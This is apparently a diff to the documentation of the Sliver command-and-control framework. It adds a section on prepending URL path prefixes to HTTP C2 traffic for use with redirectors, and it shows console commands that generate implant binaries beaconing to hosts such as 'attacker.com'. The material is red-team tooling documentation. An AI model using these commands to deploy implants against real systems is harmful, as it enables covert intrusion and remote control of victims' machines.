@@ -29,6 +29,20 @@ sliver > generate --http example.com,attacker.com
 [*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
 ```
 
+#### URL Prefixes and Other Options
+
+Some additional options may be passed to the `--http` C2 flag such as URL path prefixes. Sliver's C2 request URLs are randomly generated as described below, however the operator may specify a path to prepend to every request's path, this can be useful when leveraging HTTP re-directors, etc. To add a URL prefix simply add a path to the domain as shown below:
+
+```
+sliver > generate --http example.com/foo/bar
+
+[*] Generating new windows/amd64 implant binary
+[*] Build completed in 00:00:05
+[*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
+```
+
+This implant will now prepend `/foo/bar` to all generated URLs for `example.com`. You may specify different path prefixes for different domains if you so choose.
+
 #### Proxies
 
 The implant attempts to auto-detect proxy settings using a modified version of the [go-get-proxied](https://github.com/rapid7/go-get-proxied) library. It supports detection of system proxy settings on Windows, MacOS, and Linux. In the event the implant cannot make a successful HTTP/HTTPS connection for a given domain using the system proxy settings, it will also attempt to make a connection to the same domain ignoring the proxy settings. The order of connection attempts is as follows:
